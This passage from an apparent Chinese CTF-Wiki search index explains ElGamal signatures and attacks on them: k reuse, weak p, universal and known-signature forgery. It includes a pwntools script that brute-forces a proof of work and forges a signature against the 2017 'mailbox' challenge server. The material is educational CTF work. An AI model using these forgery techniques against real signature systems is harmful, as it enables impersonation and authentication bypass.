target ) \u6700\u540e\u7684\u811a\u672c\u5982\u4e0b from pwn import * from hashlib import sha1 import string import ast import os import binascii context . log_level = 'debug' def f ( x ): return sha1 ( prefix + x ) . digest ()[ - 2 :] == ' \\0\\0 ' def digitalize ( m ): return int ( m . encode ( 'hex' ), 16 ) sh = remote ( '106.75.66.195' , 40001 ) # bypass proof sh . recvuntil ( 'starting with ' ) prefix = sh . recvuntil ( ' \\n ' , drop = True ) print string . ascii_letters s = util . iters . mbruteforce ( f , string . ascii_letters + string . digits , 5 , 'fixed' ) test = prefix + s sh . sendline ( test ) sh . recvuntil ( 'Current PK we are using: ' ) pubkey = ast . literal_eval ( sh . recvuntil ( ' \\n ' , drop = True )) p = pubkey [ 0 ] g = pubkey [ 1 ] pk = pubkey [ 2 ] # construct the message begins with 'test' target = \"Th3_bery_un1que1i_ChArmIng_G3nji\" + test part1 = ( digitalize ( 'test' + os . urandom ( 51 )) << 512 ) // ( p - 1 ) * ( p - 1 ) victim = part1 + digitalize ( target ) while 1 : tmp = hex ( victim )[ 2 :] . decode ( 'hex' ) if tmp . startswith ( 'test' ) and ' \\n ' not in tmp : break else : part1 = ( digitalize ( 'test' + os . urandom ( 51 )) << 512 ) // ( p - 1 ) * ( p - 1 ) victim = part1 + digitalize ( target ) assert ( victim % ( p - 1 ) == digitalize ( target ) % ( p - 1 )) # get victim signature sh . sendline ( hex ( victim )[ 2 :] . decode ( 'hex' )) sh . recvuntil ( 'Your signature is' ) sig = ast . literal_eval ( sh . recvuntil ( ' \\n ' , drop = True )) sig = [ int ( sig [ 0 ], 0 ), int ( sig [ 1 ], 0 )] # get flag sh . sendline ( target ) sh . sendline ( str ( sig [ 0 ]) + \",\" + str ( sig [ 1 ])) sh . interactive () \u8fd9\u91cc\u8fd8\u8981\u8bf4\u51e0\u4e2a\u6709\u610f\u601d\u7684\u70b9\u5c31\u662f int(x,0)\u53ea\u7684\u662f\u5c06x\u6309\u7167\u5176\u5b57\u9762\u5bf9\u5e94\u7684\u8fdb\u5236\u8f6c\u6362\u4e3a\u5bf9\u5e94\u7684\u6570\u5b57\uff0c\u6bd4\u5982\u8bf4int('0x12',0)=18\uff0c\u8fd9\u91cc\u76f8\u5e94\u7684\u5b57\u9762\u5fc5\u987b\u6709\u5bf9\u5e94\u6807\u5fd7\u5f00\u5934\uff0c\u6bd4\u5982\u8bf4\u5341\u516d\u8fdb\u5236\u662f0x,8\u8fdb\u5236\u662f0\uff0c\u4e8c\u8fdb\u5236\u662f0b\u3002\u56e0\u4e3a\u5982\u679c\u6ca1\u6709\u7684\u8bdd\uff0c\u5c31\u4e0d\u77e5\u9053\u8be5\u5982\u4f55\u8bc6\u522b\u4e86\u3002 python(python2) \u91cc\u9762\u5230\u5e95\u591a\u5927\u7684\u6570\uff0c\u8ba1\u7b97\u51fa\u6765\u6700\u540e\u624d\u4f1a\u5e26\u6709L\u5462\uff1f\u6b63\u5e38\u60c5\u51b5\u4e0b\uff0c\u5927\u4e8eint\u90fd\u4f1a\u6709L\u3002\u4f46\u662f\u8fd9\u4e2a\u91cc\u9762\u7684victim\u786e\u5b9e\u662f\u6ca1\u6709\u7684\uff0c\uff0c \u4e00\u4e2a\u95ee\u9898\uff0c\u5f85\u89e3\u51b3\u3002\u3002","title":"ElGamal"},{"location":"crypto/signature/elgamal/#elgamal","text":"RSA\u7684\u6570\u5b57\u7b7e\u540d\u65b9\u6848\u51e0\u4e4e\u4e0e\u5176\u52a0\u5bc6\u65b9\u6848\u5b8c\u5168\u4e00\u81f4\uff0c\u53ea\u662f\u5229\u7528\u79c1\u94a5\u8fdb\u884c\u4e86\u7b7e\u540d\u3002\u4f46\u662f\uff0c\u5bf9\u4e8eElGamal\u6765\u8bf4\uff0c\u5176\u7b7e\u540d\u65b9\u6848\u4e0e\u76f8\u5e94\u7684\u52a0\u5bc6\u65b9\u6848\u5177\u6709\u5f88\u5927\u533a\u522b\u3002","title":"ElGamal"},{"location":"crypto/signature/elgamal/#_1","text":"","title":"\u57fa\u672c\u539f\u7406"},{"location":"crypto/signature/elgamal/#_2","text":"\u57fa\u672c\u6b65\u9aa4\u5982\u4e0b \u9009\u53d6\u4e00\u4e2a\u8db3\u591f\u5927\u7684\u7d20\u6570p\uff08\u5341\u8fdb\u5236\u4f4d\u6570\u4e0d\u4f4e\u4e8e160\uff09\uff0c\u4ee5\u4fbf\u4e8e\u5728 Z_p Z_p \u4e0a\u6c42\u89e3\u79bb\u6563\u5bf9\u6570\u95ee\u9898\u662f\u56f0\u96be\u7684\u3002 \u9009\u53d6 Z_p^* Z_p^* \u7684\u751f\u6210\u5143g\u3002 \u968f\u673a\u9009\u53d6\u6574\u6570d, 0\\leq d \\leq p-2 0\\leq d \\leq p-2 \uff0c\u5e76\u8ba1\u7b97 g^d \\equiv y \\bmod p g^d \\equiv y \\bmod p \u3002 \u5176\u4e2d\u79c1\u94a5\u4e3a{d}\uff0c\u516c\u94a5\u4e3a{p,g,y} \u3002","title":"\u5bc6\u94a5\u751f\u6210"},{"location":"crypto/signature/elgamal/#_3","text":"A\u9009\u53d6\u968f\u673a\u6570 k \\in Z_{p-1} k \\in Z_{p-1} \uff0c\u5e76\u4e14 gcd(k,p-1)=1 gcd(k,p-1)=1 \uff0c\u5bf9\u6d88\u606f\u8fdb\u884c\u7b7e\u540d sig_d(m,k)=(r,s) sig_d(m,k)=(r,s) \u5176\u4e2d r \\equiv g^k \\bmod p r \\equiv g^k \\bmod p \uff0c s \\equiv (m-dr)k^{-1} \\bmod p-1 s \\equiv (m-dr)k^{-1} \\bmod p-1 \u3002","title":"\u7b7e\u540d"},{"location":"crypto/signature/elgamal/#_4","text":"\u5982\u679c g^m \\equiv y^rr^s \\bmod p g^m \\equiv y^rr^s \\bmod p \uff0c\u90a3\u4e48\u9a8c\u8bc1\u6210\u529f\uff0c\u5426\u5219\u9a8c\u8bc1\u5931\u8d25\u3002\u8fd9\u91cc\u9a8c\u8bc1\u6210\u529f\u7684\u539f\u7406\u5982\u4e0b\uff0c\u9996\u5148\u6211\u4eec\u6709 y^rr^s \\equiv g^{dr}g^{ks} \\equiv g^{dr+ks} y^rr^s \\equiv g^{dr}g^{ks} \\equiv g^{dr+ks} \u53c8\u56e0\u4e3a s \\equiv (m-dr)k^{-1} \\bmod p-1 s \\equiv (m-dr)k^{-1} \\bmod p-1 \u6240\u4ee5 ks \\equiv m-dr \\bmod p-1 ks \\equiv m-dr \\bmod p-1 \u8fdb\u800c ks+dr=a*(p-1)+m ks+dr=a*(p-1)+m \u6240\u4ee5 g^{ks+dr}=g^{a*(p-1)+m}=(g^{p-1})^a*g^m g^{ks+dr}=g^{a*(p-1)+m}=(g^{p-1})^a*g^m \u6240\u4ee5\u6839\u636e\u8d39\u9a6c\u5b9a\u7406\uff0c\u53ef\u5f97 g^{ks+dr} \\equiv g^m \\bmod p g^{ks+dr} \\equiv g^m \\bmod p","title":"\u9a8c\u8bc1"},{"location":"crypto/signature/elgamal/#_5","text":"","title":"\u5e38\u89c1\u653b\u51fb"},{"location":"crypto/signature/elgamal/#_6","text":"","title":"\u5b8c\u5168\u7834\u8bd1\u653b\u51fb"},{"location":"crypto/signature/elgamal/#_7","text":"p\u592a\u5c0f\u6216\u65e0\u5927\u7d20\u56e0\u5b50 \u5982\u679c p p \u592a\u5c0f\u6211\u4eec\u53ef\u4ee5\u76f4\u63a5\u7528\u5927\u90e8\u5c0f\u6b65\u7b97\u6cd5\u5206\u89e3, \u6216\u8005\u5982\u679c\u5176\u65e0\u5927\u7684\u7d20\u56e0\u5b50, \u6211\u4eec\u53ef\u4ee5\u91c7\u7528 Pohling\\: Hellman Pohling\\: Hellman \u7b97\u6cd5\u8ba1\u7b97\u79bb\u6563\u5bf9\u6570\u5373\u53ef\u8fdb\u800c\u6c42\u51fa\u79c1\u94a5\u3002 \u968f\u673a\u6570k\u590d\u7528 \u5982\u679c\u7b7e\u540d\u8005\u590d\u7528\u4e86\u968f\u673a\u6570k\uff0c\u90a3\u4e48\u653b\u51fb\u8005\u5c31\u53ef\u4ee5\u8f7b\u800c\u6613\u4e3e\u5730\u8ba1\u7b97\u51fa\u79c1\u94a5\u3002\u5177\u4f53\u7684\u539f\u7406\u5982\u4e0b\uff1a \u5047\u8bbe\u76ee\u524d\u6709\u4e24\u4e2a\u7b7e\u540d\u90fd\u662f\u4f7f\u7528\u540c\u4e00\u4e2a\u968f\u673a\u6570\u8fdb\u884c\u7b7e\u540d\u7684\u3002\u90a3\u4e48\u6211\u4eec\u6709 r \\equiv g^k \\bmod p \\\\\\\\ s _1\\equiv (m_1-dr)k^{-1} \\bmod p-1\\\\\\\\ r \\equiv g^k \\bmod p \\\\\\\\ s_2 \\equiv (m_2-dr)k^{-1} \\bmod p-1 r \\equiv g^k \\bmod p \\\\\\\\ s _1\\equiv (m_1-dr)k^{-1} \\bmod p-1\\\\\\\\ r \\equiv g^k \\bmod p \\\\\\\\ s_2 \\equiv (m_2-dr)k^{-1} \\bmod p-1 \u8fdb\u800c\u6709 s_1k \\equiv m_1-dr \\bmod p-1 \\\\\\\\ s_2k \\equiv m_2-dr \\bmod p-1 s_1k \\equiv m_1-dr \\bmod p-1 \\\\\\\\ s_2k \\equiv m_2-dr \\bmod p-1 \u4e24\u5f0f\u76f8\u51cf k(s_1-s_2) \\equiv m_1-m_2 \\bmod p-1 k(s_1-s_2) \\equiv m_1-m_2 \\bmod p-1 \u8fd9\u91cc\uff0c s_1,s_2,m_1,m_2,p-1 s_1,s_2,m_1,m_2,p-1 \u5747\u5df2\u77e5\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u5f88\u5bb9\u6613\u7b97\u51fak\u3002\u5f53\u7136\uff0c\u5982\u679c gcd(s_1-s_2,p-1)!=1 gcd(s_1-s_2,p-1)!=1 \u7684\u8bdd\uff0c\u53ef\u80fd\u4f1a\u5b58\u5728\u591a\u4e2a\u89e3\uff0c\u8fd9\u65f6\u6211\u4eec\u53ea\u9700\u8981\u591a\u8bd5\u4e00\u8bd5\u3002\u8fdb\u800c\uff0c\u6211\u4eec\u53ef\u4ee5\u6839\u636es\u7684\u8ba1\u7b97\u65b9\u6cd5\u5f97\u5230\u79c1\u94a5d\uff0c\u5982\u4e0b d \\equiv \\frac{m-ks}{r} d \\equiv \\frac{m-ks}{r}","title":"\u653b\u51fb\u6761\u4ef6"},{"location":"crypto/signature/elgamal/#_8","text":"2016 LCTF Crypto 450","title":"\u9898\u76ee"},{"location":"crypto/signature/elgamal/#_9","text":"","title":"\u901a\u7528\u4f2a\u9020\u7b7e\u540d"},{"location":"crypto/signature/elgamal/#_10","text":"\u5982\u679c\u6d88\u606f m m \u6ca1\u6709\u53d6\u54c8\u5e0c\uff0c\u6216\u8005\u6d88\u606f m m \u6ca1\u6709\u6307\u5b9a\u6d88\u606f\u683c\u5f0f\u7684\u60c5\u51b5\u4e0b\u653b\u51fb\u6210\u7acb\u3002","title":"\u653b\u51fb\u6761\u4ef6"},{"location":"crypto/signature/elgamal/#_11","text":"\u5728\u653b\u51fb\u8005\u77e5\u9053\u4e86\u67d0\u4e2a\u4ebaAlice\u7684\u516c\u94a5\u4e4b\u540e\uff0c\u4ed6\u53ef\u4ee5\u4f2a\u9020Alice\u7684\u7b7e\u540d\u4fe1\u606f\u3002\u5177\u4f53\u539f\u7406\u5982\u4e0b: \u8fd9\u91cc\u6211\u4eec\u5047\u8bbe\uff0cAlice\u7684\u516c\u94a5\u4e3a{p,g,y}\u3002\u653b\u51fb\u8005\u53ef\u4ee5\u6309\u7167\u5982\u4e0b\u65b9\u5f0f\u4f2a\u9020 \u9009\u62e9\u6574\u6570 i i \uff0c j j \uff0c\u5176\u4e2d gcd(j,p-1)=1 gcd(j,p-1)=1 \u8ba1\u7b97\u7b7e\u540d\uff0c r \\equiv g^iy^j \\bmod p r \\equiv g^iy^j \\bmod p \uff0c s\\equiv -rj^{-1} \\bmod p-1 s\\equiv -rj^{-1} \\bmod p-1 \u8ba1\u7b97\u6d88\u606f\uff0c m\\equiv si \\bmod p-1 m\\equiv si \\bmod p-1 \u90a3\u4e48\u6b64\u65f6\u751f\u6210\u7684\u7b7e\u540d\u4e0e\u6d88\u606f\u5c31\u662f\u53ef\u4ee5\u88ab\u6b63\u5e38\u901a\u8fc7\u9a8c\u8bc1\uff0c\u5177\u4f53\u63a8\u5bfc\u5982\u4e0b: y^rr^s \\equiv g^{dr}g^{is}y^{js} \\equiv g^{dr}g^{djs}g^{is} \\equiv g^{dr+s(i+dj)} \\equiv g^{dr} g^{-rj^{-1}(i+dj)} \\equiv g^{dr-dr-rij^{-1}} \\equiv g^{si} \\bmod p y^rr^s \\equiv g^{dr}g^{is}y^{js} \\equiv g^{dr}g^{djs}g^{is} \\equiv g^{dr+s(i+dj)} \\equiv g^{dr} g^{-rj^{-1}(i+dj)} \\equiv g^{dr-dr-rij^{-1}} \\equiv g^{si} \\bmod p \u53c8\u7531\u4e8e\u6d88\u606fm\u7684\u6784\u9020\u65b9\u5f0f\uff0c\u6240\u4ee5 g^{si} \\equiv g^m \\bmod p-1 g^{si} \\equiv g^m \\bmod p-1 \u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u4f2a\u9020\u901a\u8fc7\u7b7e\u540d\u9a8c\u8bc1\u7684\u6d88\u606f\uff0c\u4f46\u662f\u4ed6\u5374\u65e0\u6cd5\u4f2a\u9020\u6307\u5b9a\u683c\u5f0f\u7684\u6d88\u606f\u3002\u800c\u4e14\uff0c\u4e00\u65e6\u6d88\u606f\u8fdb\u884c\u4e86\u54c8\u5e0c\u64cd\u4f5c\uff0c\u8fd9\u4e00\u653b\u51fb\u5c31\u4e0d\u518d\u53ef\u884c\u3002","title":"\u539f\u7406"},{"location":"crypto/signature/elgamal/#_12","text":"","title":"\u5df2\u77e5\u7b7e\u540d\u4f2a\u9020"},{"location":"crypto/signature/elgamal/#_13","text":"\u5047\u8bbe\u653b\u51fb\u8005\u77e5\u9053 (r, s) (r, s) \u662f\u6d88\u606f M M \u7684\u7b7e\u540d\uff0c\u5219\u653b\u51fb\u8005\u53ef\u5229\u7528\u5b83\u6765\u4f2a\u9020\u5176\u5b83\u6d88\u606f\u7684\u7b7e\u540d\u3002","title":"\u653b\u51fb\u6761\u4ef6"},{"location":"crypto/signature/elgamal/#_14","text":"\u9009\u62e9\u6574\u6570 h, i, j \\in[0, p-2] h, i, j \\in[0, p-2] \u4e14\u6ee1\u8db3 \\operatorname{gcd}(h r-j s, \\varphi(p))=1 \\operatorname{gcd}(h r-j s, \\varphi(p))=1 \u8ba1\u7b97\u4e0b\u5f0f \\begin{array}{l} r^{\\prime}=r^{h} \\alpha^{i} y_{A}^{j} \\bmod p \\\\ s^{\\prime}=\\operatorname{sr}(h r-j s)^{-1} \\bmod \\varphi(p) \\\\ m^{\\prime}=r^{\\prime}(h m+i s)(h r-j s)^{-1} \\bmod \\varphi(p) \\end{array} \\begin{array}{l} r^{\\prime}=r^{h} \\alpha^{i} y_{A}^{j} \\bmod p \\\\ s^{\\prime}=\\operatorname{sr}(h r-j s)^{-1} \\bmod \\varphi(p) \\\\ m^{\\prime}=r^{\\prime}(h m+i s)(h r-j s)^{-1} \\bmod \\varphi(p) \\end{array} \u53ef\u5f97\u5230 (r',s') (r',s') \u662f m' m' \u7684\u6709\u6548\u7b7e\u540d \u8bc1\u660e\u5982\u4e0b: \u5df2\u77e5Alice\u5bf9\u6d88\u606f x x \u7684\u7b7e\u540d (\\gamma,\\delta) (\\gamma,\\delta) \u6ee1\u8db3 \\beta^{\\gamma} \\gamma^{\\delta} \\equiv \\alpha^{x}(\\bmod p) \\beta^{\\gamma} \\gamma^{\\delta} \\equiv \\alpha^{x}(\\bmod p) \uff0c\u6240\u4ee5\u6211\u4eec\u76ee\u7684\u4e3a\u6784\u9020\u51fa \\left(x^{\\prime}, \\lambda, \\mu\\right) \\left(x^{\\prime}, \\lambda, \\mu\\right) \u6ee1\u8db3 \\beta^{\\lambda} \\lambda^{\\mu} \\equiv \\alpha^{x'}(\\bmod p) \\beta^{\\lambda} \\lambda^{\\mu} \\equiv \\alpha^{x'}(\\bmod p) \u90a3\u4e48\uff0c\u9996\u5148\u6211\u4eec\u628a \\lambda \\lambda \u8868\u793a\u4e3a\u4e09\u4e2a\u5df2\u77e5\u5e95 \\alpha, \\beta, \\gamma \\alpha, \\beta, \\gamma \u7684\u5f62\u5f0f: \\lambda=\\alpha^{i} \\beta^{j} \\gamma^{h} \\bmod p \\lambda=\\alpha^{i} \\beta^{j} \\gamma^{h} \\bmod p ,\u7531\u6761\u4ef6\u53ef\u5f97 \\beta^{\\gamma} \\gamma^{\\delta} \\equiv \\alpha^{x}(\\bmod p) \\Leftrightarrow \\gamma=\\left(\\beta^{-\\gamma} \\alpha^{x}\\right)^{\\delta-1} \\bmod p \\beta^{\\gamma} \\gamma^{\\delta} \\equiv \\alpha^{x}(\\bmod p) \\Leftrightarrow \\gamma=\\left(\\beta^{-\\gamma} \\alpha^{x}\\right)^{\\delta-1} \\bmod p \u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u5f97\u5230 \\lambda=\\alpha^{i+x \\delta^{-1} h} \\beta^{j-\\gamma \\delta^{-1} h} \\bmod p \\lambda=\\alpha^{i+x \\delta^{-1} h} \\beta^{j-\\gamma \\delta^{-1} h} \\bmod p \u6211\u4eec\u628a \\lambda \\lambda \u7684\u8868\u8fbe\u5f0f\u4ee3\u5165\u4e00\u5f0f\u4e2d \\begin{aligned}& \\beta^{\\lambda}\\left(\\alpha^{i+x \\delta^{-1} h} \\beta^{j-\\gamma \\delta^{-1} h}\\right)^{\\mu} \\equiv \\alpha^{x^{\\prime}}(\\bmod p) \\\\\\Leftrightarrow & \\beta^{\\lambda+\\left(j-\\gamma \\delta^{-1} h\\right) \\mu} \\equiv \\alpha^{x^{\\prime}-\\left(i+x \\delta^{-1} h\\right) \\mu}(\\bmod p)\\end{aligned} \\begin{aligned}& \\beta^{\\lambda}\\left(\\alpha^{i+x \\delta^{-1} h} \\beta^{j-\\gamma \\delta^{-1} h}\\right)^{\\mu} \\equiv \\alpha^{x^{\\prime}}(\\bmod p) \\\\\\Leftrightarrow & \\beta^{\\lambda+\\left(j-\\gamma \\delta^{-1} h\\right) \\mu} \\equiv \\alpha^{x^{\\prime}-\\left(i+x \\delta^{-1} h\\right) \\mu}(\\bmod p)\\end{aligned} \u6211\u4eec\u4ee4\u4e24\u8fb9\u6307\u6570\u4e3a 0 0 , \u5373 \\left\\{\\begin{matrix}\\lambda+\\left(j-\\gamma \\delta^{-1} h\\right) \\mu \\equiv 0 \\bmod p-1 \\\\ x^{\\prime}-\\left(i+x \\delta^{-1} h\\right) \\mu \\equiv 0 \\bmod p-1 \\end{matrix}\\right. \\left\\{\\begin{matrix}\\lambda+\\left(j-\\gamma \\delta^{-1} h\\right) \\mu \\equiv 0 \\bmod p-1 \\\\ x^{\\prime}-\\left(i+x \\delta^{-1} h\\right) \\mu \\equiv 0 \\bmod p-1 \\end{matrix}\\right. \u53ef\u4ee5\u5f97\u5230 \\mu=\\delta \\lambda(h \\gamma-j \\delta)^{-1} \\quad(\\bmod p-1) \\\\ x^{\\prime}=\\lambda(h x+i \\delta)(h \\gamma-j \\delta)^{-1}(\\bmod p-1) \\mu=\\delta \\lambda(h \\gamma-j \\delta)^{-1} \\quad(\\bmod p-1) \\\\ x^{\\prime}=\\lambda(h x+i \\delta)(h \\gamma-j \\delta)^{-1}(\\bmod p-1) \u5176\u4e2d \\lambda=\\alpha^{i} \\beta^{j} \\gamma^{h} \\bmod p \\lambda=\\alpha^{i} \\beta^{j} \\gamma^{h} \\bmod p \u6240\u4ee5\u6211\u4eec\u5f97\u5230 (\\lambda, \\mu) (\\lambda, \\mu) \u662f x' x' \u7684\u6709\u6548\u7b7e\u540d\u3002 \u6b64\u5916,\u6211\u4eec\u8fd8\u53ef\u4ee5\u501f\u52a9CRT\u6784\u9020 m' m' , \u539f\u7406\u5982\u4e0b: u=m^{\\prime} m^{-1} \\bmod \\varphi(p), \\quad s^{\\prime}=s u \\bmod \\varphi(p) u=m^{\\prime} m^{-1} \\bmod \\varphi(p), \\quad s^{\\prime}=s u \\bmod \\varphi(p) \u518d\u8ba1\u7b97 r^{\\prime}, \\quad r^{\\prime} \\equiv r u \\bmod \\varphi(p), r^{\\prime} \\equiv r \\bmod p r^{\\prime}, \\quad r^{\\prime} \\equiv r u \\bmod \\varphi(p), r^{\\prime} \\equiv r \\bmod p \u663e\u7136\u53ef\u4ee5\u4f7f\u7528CRT\u6c42\u89e3 r' r' , \u6ce8\u610f\u5230 y_{A}^{r'} r'^{s^{\\prime}}=y_{A}^{ru} r^{s u}=\\left(y_{A}^{r} r^{s}\\right)^{u}=\\alpha^{m u} \\equiv \\alpha^{m} \\bmod p y_{A}^{r'} r'^{s^{\\prime}}=y_{A}^{ru} r^{s u}=\\left(y_{A}^{r} r^{s}\\right)^{u}=\\alpha^{m u} \\equiv \\alpha^{m} \\bmod p \u6240\u4ee5 (r',s') (r',s') \u662f\u6d88\u606f m' m' \u7684\u6709\u6548\u7b7e\u540d\u3002 \u62b5\u6297\u63aa\u65bd:\u5728\u9a8c\u8bc1\u7b7e\u540d\u65f6, \u68c0\u67e5 r < p r < p \u3002","title":"\u539f\u7406"},{"location":"crypto/signature/elgamal/#_15","text":"","title":"\u9009\u62e9\u7b7e\u540d\u4f2a\u9020"},{"location":"crypto/signature/elgamal/#_16","text":"\u5982\u679c\u6211\u4eec\u53ef\u4ee5\u9009\u62e9\u6211\u4eec\u6d88\u606f\u8fdb\u884c\u7b7e\u540d\uff0c\u5e76\u4e14\u53ef\u4ee5\u5f97\u5230\u7b7e\u540d\uff0c\u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u5bf9\u4e00\u4e2a\u65b0\u7684\u4f46\u662f\u6211\u4eec\u4e0d\u80fd\u591f\u9009\u62e9\u7b7e\u540d\u7684\u6d88\u606f\u4f2a\u9020\u7b7e\u540d\u3002","title":"\u653b\u51fb\u6761\u4ef6"},{"location":"crypto/signature/elgamal/#_17","text":"\u6211\u4eec\u77e5\u9053\uff0c\u6700\u540e\u9a8c\u8bc1\u7684\u8fc7\u7a0b\u5982\u4e0b g^m \\equiv y^rr^s \\bmod p g^m \\equiv y^rr^s \\bmod p \u90a3\u4e48\u53ea\u8981\u6211\u4eec\u9009\u62e9\u4e00\u4e2a\u6d88\u606fm\u4f7f\u5176\u548c\u6211\u4eec\u6240\u8981\u4f2a\u9020\u7684\u6d88\u606f m' m' \u6a21p-1\u540c\u4f59\uff0c\u7136\u540e\u540c\u65f6\u4f7f\u7528\u6d88\u606fm\u7684\u7b7e\u540d\u5373\u53ef\u7ed5\u8fc7\u3002","title":"\u539f\u7406"},{"location":"crypto/signature/elgamal/#_18","text":"\u8fd9\u91cc\u4ee52017\u5e74\u56fd\u8d5bmailbox\u4e3a\u4f8b\uff0c i\u6625\u79cb\u6709\u590d\u73b0 \u3002 \u9996\u5148\uff0c\u6211\u4eec\u6765\u5206\u6790\u4e00\u4e0b\u7a0b\u5e8f\uff0c\u6211\u4eec\u9996\u5148\u9700\u8981\u8fdb\u884cproof of work proof = b64 . b64encode ( os . urandom ( 12 )) req . sendall ( \"Please provide your proof of work, a sha1 sum ending in 16 bit's set to 0, it must be of length %d bytes, starting with %s \\n \" % ( len ( proof ) + 5 , proof )) test = req . recv ( 21 ) ha = hashlib . sha1 () ha . update ( test ) if ( test [ 0 : 16 ] != proof or ord ( ha . digest ()[ - 1 ]) != 0 or ord ( ha . digest ()[ - 2 ]) != 0 ): # or ord(ha.digest()[-3]) != 0 or ord(ha.digest()[-4]) != 0): req . sendall ( \"Check failed\" ) req . close () return \u6211\u4eec\u9700\u8981\u751f\u6210\u4e00\u4e2a\u4ee5proof\u5f00\u5934\u7684\u957f\u5ea6\u4e3aproof\u957f\u5ea6\u52a05\u7684\u5b57\u7b26\u4e32\uff0c\u5e76\u4e14\u5176sha1\u7684\u503c\u4ee516\u6bd4\u7279\u76840\u7ed3\u675f\u3002 \u8fd9\u91cc\u6211\u4eec\u76f4\u63a5\u4f7f\u7528\u5982\u4e0b\u7684\u65b9\u5f0f\u6765\u7ed5\u8fc7\u3002 def f ( x ): return sha1 ( prefix + x ) . digest ()[ - 2 :] == ' \\0\\0 ' sh = remote ( '106.75.66.195' , 40001 ) # bypass proof sh . recvuntil ( 'starting with ' ) prefix = sh . recvuntil ( ' \\n ' , drop = True ) print string . ascii_letters s = util . iters . mbruteforce ( f , string . ascii_letters + string . digits , 5 , 'fixed' ) test = prefix + s sh . sendline ( test ) \u8fd9\u91cc\u4f7f\u7528\u4e86pwntools\u4e2d\u7684util.iters.mbruteforce\uff0c\u8fd9\u662f\u4e00\u4e2a\u5229\u7528\u7ed9\u5b9a\u5b57\u7b26\u96c6\u5408\u4ee5\u53ca\u6307\u5b9a\u957f\u5ea6\u8fdb\u884c\u591a\u7ebf\u7a0b\u7206\u7834\u7684\u51fd\u6570\u3002\u5176\u4e2d\uff0c\u7b2c\u4e00\u4e2a\u53c2\u6570\u4e3a\u7206\u7834\u51fd\u6570\uff0c\u8fd9\u91cc\u662fsha1\uff0c\u7b2c\u4e8c\u4e2a\u53c2\u6570\u662f\u5b57\u7b26\u96c6\uff0c\u7b2c\u4e09\u4e2a\u53c2\u6570\u662f\u5b57\u8282\u6570\uff0c\u7b2c\u56db\u4e2a\u53c2\u6570\u6307\u7684\u662f\u6211\u4eec\u53ea\u5c1d\u8bd5\u5b57\u8282\u6570\u4e3a\u7b2c\u4e09\u4e2a\u53c2\u6570\u6307\u5b9a\u5b57\u8282\u6570\u7684\u6392\u5217\uff0c\u5373\u957f\u5ea6\u662f\u56fa\u5b9a\u7684\u3002\u66f4\u52a0\u5177\u4f53\u7684\u4fe1\u606f\u8bf7\u53c2\u8003pwntools\u3002 \u7ed5\u8fc7\u4e4b\u540e\uff0c\u6211\u4eec\u7ee7\u7eed\u5206\u6790\u7a0b\u5e8f\uff0c\u7b80\u5355\u770b\u4e0bgenerate_keys\u51fd\u6570\uff0c\u53ef\u4ee5\u77e5\u9053\u8be5\u51fd\u6570\u662fElGamal\u751f\u6210\u516c\u94a5\u7684\u8fc7\u7a0b\uff0c\u7136\u540e\u770b\u4e86\u770bverify\u51fd\u6570\uff0c\u5c31\u662f\u9a8c\u8bc1\u7b7e\u540d\u7684\u8fc7\u7a0b\u3002 \u7ee7\u7eed\u5206\u6790 if len ( msg ) > MSGLENGTH : req . sendall ( \"what r u do'in?\" ) req . close () return if msg [: 4 ] == \"test\" : r , s = sign ( digitalize ( msg ), sk , pk , p , g ) req . sendall ( \"Your signature is\" + repr (( hex ( r ), hex ( s ))) + \" \\n \" ) else : if msg == \"Th3_bery_un1que1i_ChArmIng_G3nji\" + test : req . sendall ( \"Signature:\" ) sig = self . rfile . readline () . strip () if len ( sig ) > MSGLENGTH : req . sendall ( \"what r u do'in?\" ) req . close () return sig_rs = sig . split ( \",\" ) if len ( sig_rs ) < 2 : req . sendall ( \"yo what?\" ) req . close () return # print \"Got sig\", sig_rs if verify ( digitalize ( msg ), int ( sig_rs [ 0 ]), int ( sig_rs [ 1 ]), pk , p , g ): req . sendall ( \"Login Success. \\n Dr. Ziegler has a message for you: \" + FLAG ) print \"shipped flag\" req . close () return else : req . sendall ( \"You are not the Genji I knew! \\n \" ) \u6839\u636e\u8fd9\u4e09\u4e2aif\u6761\u4ef6\u53ef\u4ee5\u77e5\u9053 \u6211\u4eec\u7684\u6d88\u606f\u957f\u5ea6\u4e0d\u80fd\u8d85\u8fc7MSGLENGTH\uff0c40000\u3002 \u6211\u4eec\u53ef\u4ee5\u5bf9\u6d88\u606f\u5f00\u5934\u4e3atest\u7684\u6d88\u606f\u8fdb\u884c\u7b7e\u540d\u3002 \u6211\u4eec\u9700\u8981\u4f7f\u5f97\u4ee5Th3_bery_un1que1i_ChArmIng_G3nji\u5f00\u5934\uff0c\u4ee5\u6211\u4eec\u7ed5\u8fc7proof\u7684test\u4e3a\u7ed3\u5c3e\u7684\u6d88\u606f\u901a\u8fc7\u7b7e\u540d\u9a8c\u8bc1\uff0c\u5176\u4e2d\uff0c\u6211\u4eec\u53ef\u4ee5\u81ea\u5df1\u63d0\u4f9b\u7b7e\u540d\u7684\u503c\u3002 \u5206\u6790\u5230\u8fd9\u91cc\uff0c\u5176\u5b9e\u5c31\u77e5\u9053\u4e86\uff0c\u6211\u4eec\u5c31\u662f\u5728\u9009\u62e9\u6307\u5b9a\u7b7e\u540d\u8fdb\u884c\u4f2a\u9020\uff0c\u8fd9\u91cc\u6211\u4eec\u81ea\u7136\u8981\u5145\u5206\u5229\u7528\u7b2c\u4e8c\u4e2aif\u6761\u4ef6\uff0c\u53ea\u8981\u6211\u4eec\u786e\u4fdd\u6211\u4eec\u8f93\u5165\u7684\u6d88\u606f\u7684\u5f00\u5934\u4e3a\u2018test\u2019\uff0c\u5e76\u4e14\u8be5\u6d88\u606f\u4e0e\u4ee5Th3_bery_un1que1i_ChArmIng_G3nji\u5f00\u5934\u7684\u56fa\u5b9a\u6d88\u606f\u6a21p-1\u540c\u4f59\uff0c\u6211\u4eec\u5373\u53ef\u4ee5\u901a\u8fc7\u9a8c\u8bc1\u3002 